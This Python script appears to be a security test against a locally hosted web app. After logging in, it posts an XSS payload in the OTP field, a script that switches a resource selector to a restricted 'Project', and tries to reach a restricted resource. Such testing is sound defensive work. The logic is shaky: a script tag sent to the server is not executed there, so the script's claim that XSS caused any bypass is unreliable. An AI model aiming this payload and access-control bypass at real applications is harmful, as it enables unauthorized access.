import requests
from urllib.parse import quote
import time
from testing_credentials import EMAIL, PASSWORD, RESOURCE

BASE_URL = "http://127.0.0.1:5000"

developer_credentials = {
    'Email': EMAIL, 
    'Password': PASSWORD 
}

restricted_resource = 'Project'

malicious_payload = '<script>document.querySelector("select[name=\'resource\']").value = "Project";</script>'

test_name = "Cross-Site Scripting (XSS) Resource Manipulation Attack"

session = requests.Session()

print(f"\n{test_name} - Test Execution Started\n")
print("Step 1: Attempting to log in with developer credentials...")
login_response = session.post(BASE_URL + "/", data=developer_credentials)

if "otp_input" in login_response.text:
    print("Login successful. Proceeding to OTP verification...")

    exploit_data = {
        'otp': '^5h{88',
        'resource': restricted_resource
    }

    print("\nStep 2: Injecting malicious payload into the OTP field...")
    time.sleep(2)

    login_response = session.post(BASE_URL + "/", data=developer_credentials)
    exploit_data['otp'] = malicious_payload

    print("\nPayload successfully injected into the OTP field.\n")
    print("Attempting to exploit the OTP and resource access control...\n")
    
    exploit_response = session.post(BASE_URL + "/verify_otp_and_grant_access", data=exploit_data)

    print("Step 3: Analyzing exploit response...")
    time.sleep(1)
    
    if "Access Granted" in exploit_response.text:
        print(f"\n[INFO] Attack successful! Developer accessed the restricted resource: {restricted_resource}")
        print("[INFO] Resource control bypassed due to the injected XSS payload.")
    else:
        print("\n[ERROR] Attack failed. Access control is effective. Resource manipulation not successful.")
else:
    print("\n[ERROR] Login failed. Check developer credentials or application state.")

print("\nTest execution complete.")
time.sleep(1)
